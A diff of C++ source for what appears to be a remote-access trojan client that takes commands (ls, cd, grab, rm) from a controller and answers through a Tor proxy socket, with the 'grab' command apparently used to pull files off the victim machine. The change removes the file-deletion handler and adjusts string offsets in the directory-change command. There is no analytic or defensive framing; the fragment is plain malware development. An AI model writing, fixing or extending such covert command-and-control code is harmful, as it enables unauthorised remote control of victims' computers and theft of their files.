@@ -134,11 +134,8 @@ public:
             else if (cmd == "ls;") {
                 this->ls();
             }
-            else if (cmd.starts_with("rm")) {
-                this->rm(cmd.substr(3, cmd.size() - 1));
-            }
             else if (cmd.starts_with("cd;")) {
-                this->cd(cmd.substr(3, cmd.size() - 1));
+                this->cd(cmd.substr(3, cmd.size() - 4));
             }
             else if (cmd.starts_with("grab;")) {
                 this->grab(cmd.substr(5, cmd.size() - 6));
@@ -183,12 +180,8 @@ public:
         this->torSock.proxySendStr(response);
     }
 
-    void rm(std::string path) {
-        this->torSock.proxySendStr("rm;" + (std::filesystem::remove(path)) ? "success" : "failed");
-    }
-
     void cd(std::string path){
-        std::wstring pathWStr(path.begin(), path.end() - 1);
+        std::wstring pathWStr(path.begin(), path.end());
         BOOL success = SetCurrentDirectory(pathWStr.c_str());
         std::string response = "cd;" + path + ((success) ? "success;" : "failed;");
         this->torSock.proxySendStr(response);
